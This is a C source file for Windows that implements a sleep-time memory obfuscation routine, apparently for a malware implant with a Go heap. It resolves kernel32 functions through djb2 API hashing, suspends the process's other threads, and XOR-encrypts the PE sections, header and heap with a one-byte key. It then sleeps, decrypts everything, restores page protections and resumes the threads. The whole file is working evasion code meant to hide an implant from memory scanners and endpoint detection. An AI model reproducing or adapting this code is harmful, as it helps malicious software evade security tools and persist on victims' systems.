#include "run.h"


VOID run( DWORD inSleepTime, LPVOID heapObj )
{  
    // Create dynamically resolved function pointers.
    fpVirtualProtect _VirtualProtect                     = NULL;
    fpSleep          _Sleep                              = NULL;
    fpVirtualQuery _VirtualQuery                         = NULL;
    fpGetModuleHandleA _GetModuleHandleA                 = NULL;
    fpGetSystemTime _GetSystemTime                       = NULL;
    fpSystemTimeToFileTime _SystemTimeToFileTime         = NULL;
    fpGetCurrentThreadId _GetCurrentThreadId             = NULL;
    fpCreateToolhelp32Snapshot _CreateToolhelp32Snapshot = NULL;
    fpThread32First _Thread32First                       = NULL;
    fpOpenThread _OpenThread                             = NULL;
    fpSuspendThread _SuspendThread                       = NULL;
    fpCloseHandle _CloseHandle                           = NULL;
    fpThread32Next _Thread32Next                         = NULL;
    fpGetCurrentProcessId _GetCurrentProcessId           = NULL;
    fpResumeThread _ResumeThread                         = NULL;

    // get our beloved printf
    //LPVOID pmsvcrtDll = GetModuleByHash( MSVCRTDLL_HASH );
    //fpPrintf _printf                                     = NULL;
    //_printf = GetProcAddressByHash(pmsvcrtDll, Printf_HASH);
    //_printf("hello from my sleepcode", NULL);
   
    // Save the base address.
    PIMAGE_NT_HEADERS64   pNtHeaders     = NULL;
	PIMAGE_FILE_HEADER    pFileHeader    = NULL;
    PIMAGE_SECTION_HEADER pFirstSection  = NULL;

    // Array for storing the different memory protection values for each section.
    // This assumes there will not be more than 256 sections, which would be crazy...
    DWORD dwProtectionArr[256];

    #pragma region function-resolution
    /// Resolve the address of KERNEL32.DLL via djb2 hash.
    LPVOID pKernel32Dll = NULL;
    pKernel32Dll = GetModuleByHash( KERNEL32DLL_HASH1 );
    if ( NULL == pKernel32Dll )
    {
        /// Resolve the address of kernel32.dll via djb2 hash.
        pKernel32Dll = GetModuleByHash( KERNEL32DLL_HASH2 );
        if ( NULL == pKernel32Dll )
        {
            /// Resolve the address of Kernel32.dll via djb2 hash.
            pKernel32Dll = GetModuleByHash( KERNEL32DLL_HASH3 );
            if ( NULL == pKernel32Dll ) {
                return;
            }
        }
    }
    
    // Dynamically resolve needed functions via djb2 hash.
    _VirtualProtect = GetProcAddressByHash( pKernel32Dll, VirtualProtect_HASH );
    if ( NULL == _VirtualProtect ) {
        return;
    }
    _Sleep = GetProcAddressByHash( pKernel32Dll, Sleep_HASH );
    if ( NULL == _Sleep ) {
        return;
    }
    _VirtualQuery = GetProcAddressByHash( pKernel32Dll, VirtualQuery_HASH );
    if ( NULL == _VirtualQuery ) {
        return;
    }
    _GetModuleHandleA = GetProcAddressByHash( pKernel32Dll, GetModuleHandleA_HASH );
    if ( NULL == _GetModuleHandleA ) {
        return;
    }
    _GetSystemTime = GetProcAddressByHash( pKernel32Dll, GetSystemTime_HASH );
    if ( NULL == _GetSystemTime ) {
        return;
    }
    _SystemTimeToFileTime = GetProcAddressByHash( pKernel32Dll, SystemTimeToFileTime_HASH);
    if ( NULL == _SystemTimeToFileTime ) {
        return;
    }
    _GetCurrentThreadId = GetProcAddressByHash( pKernel32Dll, GetCurrentThreadId_HASH);
    if ( NULL == _GetCurrentThreadId ) {
        return;
    }
    _CreateToolhelp32Snapshot = GetProcAddressByHash( pKernel32Dll, CreateToolhelp32Snapshot_HASH);
    if ( NULL == _CreateToolhelp32Snapshot ) {
        return;
    }
    _Thread32First = GetProcAddressByHash( pKernel32Dll, Thread32First_HASH);
    if ( NULL == _Thread32First ) {
        return;
    }
    _OpenThread = GetProcAddressByHash( pKernel32Dll, OpenThread_HASH);
    if ( NULL == _OpenThread ) {
        return;
    }
    _SuspendThread = GetProcAddressByHash( pKernel32Dll, SuspendThread_HASH);
    if ( NULL == _SuspendThread ) {
        return;
    }
    _CloseHandle = GetProcAddressByHash( pKernel32Dll, CloseHandle_HASH);
    if ( NULL == _CloseHandle ) {
        return;
    }
    _Thread32Next = GetProcAddressByHash( pKernel32Dll, Thread32Next_HASH);
    if ( NULL == _Thread32Next ) {
        return;
    }
    _GetCurrentProcessId = GetProcAddressByHash( pKernel32Dll, GetCurrentProcessId_HASH);
    if ( NULL == _GetCurrentProcessId ) {
        return;
    }
    _ResumeThread = GetProcAddressByHash( pKernel32Dll, ResumeThread_HASH);
    if ( NULL == _ResumeThread ) {
        return;
    }
    #pragma endregion function-resolution


    //_printf("all functions are resolved now", NULL);

    // PAUSE OTHER THREADS
    DWORD currentThreadId = _GetCurrentThreadId();
    //_printf("currentthreadid thread %i", currentThreadId);
    HANDLE hSnapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32;

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        te32.dwSize = sizeof(THREADENTRY32);
        if (_Thread32First(hSnapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == _GetCurrentProcessId() && te32.th32ThreadID != currentThreadId) {
                    HANDLE hThread = _OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                    if (hThread != NULL) {
                        //_printf("suspending thread %i", te32.th32ThreadID);
                        _SuspendThread(hThread);
                        _CloseHandle(hThread);
                    }
                }
            } while (_Thread32Next(hSnapshot, &te32));
        }
    }
    //_printf("all threads were suspended", NULL);

    // ENCRYPT PE
    // get pointer to baseimage
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) _GetModuleHandleA(NULL);

    // Get a pointer to the NT header.
	pNtHeaders = ( PIMAGE_NT_HEADERS64 )(( PBYTE )pDosHeader + ( DWORD )pDosHeader->e_lfanew);

    // Get a pointer to the file header.
	pFileHeader = &(pNtHeaders->FileHeader);

    // Get the offset of the beginning of section headers/first section header.
	pFirstSection = ( PIMAGE_SECTION_HEADER )(( ULONGLONG ) & (pNtHeaders->OptionalHeader) + pFileHeader->SizeOfOptionalHeader);
    
    //_printf("start encrypting the PE", NULL);

    // Parse and print data for each section.
	for ( WORD i = 0; i < pFileHeader->NumberOfSections; i++ )
	{   
        // Get the virtual address of the current section.
        PIMAGE_SECTION_HEADER pSectionHeader = ( PIMAGE_SECTION_HEADER )(( ULONGLONG )pFirstSection 
                                             + ( IMAGE_SIZEOF_SECTION_HEADER * i));
		
        // Skip empty sections
        if ( pSectionHeader->PointerToRawData == 0 || pSectionHeader->SizeOfRawData == 0 ) {
			continue; 
        }

        // Get the actual VA of the section start.
        LPVOID lpSectionAddress = ( PIMAGE_SECTION_HEADER )(( UINT64 )pDosHeader 
                                + ( UINT64 )pSectionHeader->VirtualAddress);

        // Get the section characteristics field.
        DWORD dwCharacteristics = pSectionHeader->Characteristics;
        
        // Find the actual memory protection of the section.
        /*
            0x20000000 = IMAGE_SCN_MEM_EXECUTE = Executable
            0x40000000 = IMAGE_SCN_MEM_READ    = Readable
            0x80000000 = IMAGE_SCN_MEM_WRITE   = Writable
        */
        // Right shift 28 bits to get just the protection value as a DWORD.
        DWORD dwShifted = dwCharacteristics >> 28;

        // Switch on the memory protection value and save it in the protection array.
        switch ( dwShifted )
        {
            case 0x2: // X
                dwProtectionArr[i] = PAGE_EXECUTE;
                break;
            case 0x4:// R
                dwProtectionArr[i] = PAGE_READONLY;
                break;
            case 0x6: // R+X
                dwProtectionArr[i] = PAGE_EXECUTE_READ;
                break;
            case 0xC: // R+W
                dwProtectionArr[i] = PAGE_READWRITE;
                break;
            default:
                break;
        }

        // Encrypt each section.
        ////_printf(formatter, lpSectionAddress);
        if ( !EncryptSection( lpSectionAddress, ( DWORD )RoundUp( pSectionHeader->Misc.VirtualSize, 0x1000 ), 
                              PAGE_READWRITE, _VirtualProtect )) {
            //_printf("could not encrypt section %p", lpSectionAddress);
            return;
        }
    }

    // Encrypt the PE header page. It is 1 page/4k long.
    if ( !EncryptSection( pDosHeader, 0x1000, PAGE_READWRITE, _VirtualProtect )) {
        //_printf("could not encrypt pe", NULL);
        return;
    }

    // ENCRYPT HEAP
    //_printf("start encrypting the heap", NULL);

    // lets get the heap start with our object
    LPVOID heapStart = 0xc000000000;
    MEMORY_BASIC_INFORMATION memInfo;
    if (_VirtualQuery(heapObj, &memInfo, sizeof(memInfo)) != 0){
        heapStart = memInfo.AllocationBase;
        //_printf(formatter, heapStart);
    }

    LPVOID baseAddress = heapStart;

    // go through all sections until we leave the allocationbase of golang heap and xor section
    while (_VirtualQuery(baseAddress, &memInfo, sizeof(memInfo)) != 0 &&  memInfo.AllocationBase == heapStart) {
        ////_printf(formatter, baseAddress);
        ////_printf(formatter, memInfo.RegionSize);
        ////_printf(formatter, memInfo.AllocationBase);
        if (memInfo.Protect & PAGE_READWRITE) {
            XORSingle( (PCHAR) baseAddress, memInfo.RegionSize, 0x4C );
        }
        baseAddress = (char*)baseAddress + memInfo.RegionSize;
    }  

    //_printf("all done, going to sleep now", NULL);

    // Sleep for x milliseconds.
    // I am unable to make this work for everything above 50 seconds?!
    //_printf("sleep time is %i millis", inSleepTime);
    _Sleep(inSleepTime);
    //_printf("slept fine, now decrypting", NULL);

    // Decrypt the PE header page. This must be done before the other sections,
    // as the PE headers are needed to parse the sections.
    if ( !DecryptSection( pDosHeader, 0x1000, PAGE_READONLY, _VirtualProtect )) {
        return;
    }

    // Decrypt each section and restore its memory protections.
	for ( WORD i = 0; i < pFileHeader->NumberOfSections; i++ )
	{    
        // Get the address of the current section.
        PIMAGE_SECTION_HEADER pSectionHeader = ( PIMAGE_SECTION_HEADER )(( ULONGLONG )pFirstSection
                                             + (IMAGE_SIZEOF_SECTION_HEADER * i));
		
        // Skip empty sections.
        if ( pSectionHeader->PointerToRawData == 0 || pSectionHeader->SizeOfRawData == 0 ) {
			continue; 
        }

        // Get the actual address of the section start. Base address + VA.
        LPVOID lpSectionAddress = ( PIMAGE_SECTION_HEADER )(( UINT64 )pDosHeader
                                + ( UINT64 )pSectionHeader->VirtualAddress);

        // Decrypt each section, rounding the size up to the nearest 4k page.
        ////_printf(formatter, lpSectionAddress);
        if ( !DecryptSection( lpSectionAddress, ( DWORD )RoundUp( pSectionHeader->Misc.VirtualSize, 0x1000 ), 
                              dwProtectionArr[i], _VirtualProtect )) {
            //_printf("could not decrypt section %p", lpSectionAddress);
            return;
        }
    }

    //_printf("decrypting heap", NULL);
    // Decrypt the heap
    baseAddress = heapStart;
    while (_VirtualQuery(baseAddress, &memInfo, sizeof(memInfo)) != 0 &&  memInfo.AllocationBase == heapStart) {
        if (memInfo.Protect & PAGE_READWRITE) {
            XORSingle( (PCHAR) baseAddress, memInfo.RegionSize, 0x4C );
        }
        baseAddress = (char*)baseAddress + memInfo.RegionSize;
    }

    //_printf("resume paused threads", NULL);
    if (_Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == _GetCurrentProcessId() && te32.th32ThreadID != currentThreadId) {
                HANDLE hThread = _OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                if (hThread != NULL) {
                    //_printf("resume thread %i", te32.th32ThreadID);
                    _ResumeThread(hThread);
                    _CloseHandle(hThread);
                }
            }
        } while (_Thread32Next(hSnapshot, &te32));
    }
    _CloseHandle(hSnapshot);

    // Done
    //_printf("all done! :)", NULL);

    return;
}

// XOR a buffer with a static 1 byte key.
VOID XORSingle( CHAR szInput[], SIZE_T nLength, BYTE cKey )
{
    for ( SIZE_T i = 0; i < nLength; i++ )
    {
        szInput[i] = ( BYTE )szInput[i] ^ cKey;
    }
}

// Round a value to the nearest multiple. For rounding to the nearest 4k page.
// Bit twiddling magic taken from Stack Overflow...
// https://stackoverflow.com/a/9194117
ULONGLONG RoundUp( ULONGLONG numToRound, ULONGLONG multiple) 
{
    return ( numToRound + multiple - 1 ) & -multiple;
}

// XOR encrypt a section. Takes the address of VirtualProtect so we don't have to resolve it.
BOOL EncryptSection( LPVOID pSectionAddress, DWORD dwSectionLen, DWORD dwProtection, fpVirtualProtect _VirtualProtect )
{
    // Change the protection of section to RW.
    DWORD dwOldProtect = 0;
    if ( !_VirtualProtect( pSectionAddress, dwSectionLen, dwProtection, &dwOldProtect )) {
        return FALSE;
    }

    // XOR the section with a static 1 byte key.
    XORSingle( (PCHAR)pSectionAddress, dwSectionLen, 0x4C );
    return TRUE;
}

// XOR decrypt a section. Takes the address of VirtualProtect so we don't have to resolve it.
BOOL DecryptSection( LPVOID pSectionAddress, DWORD dwSectionLen, DWORD dwProtection, fpVirtualProtect _VirtualProtect )
{
    // XOR the section with a static 1 byte key. The memory protection should already be RW.
    XORSingle( (PCHAR)pSectionAddress, dwSectionLen, 0x4C );

    // Change the protection of the section back to the original protection.
    DWORD dwOldProtect = 0;
    if ( !_VirtualProtect( pSectionAddress, dwSectionLen, dwProtection, &dwOldProtect )) {
        return FALSE;
    }
    return TRUE;
}
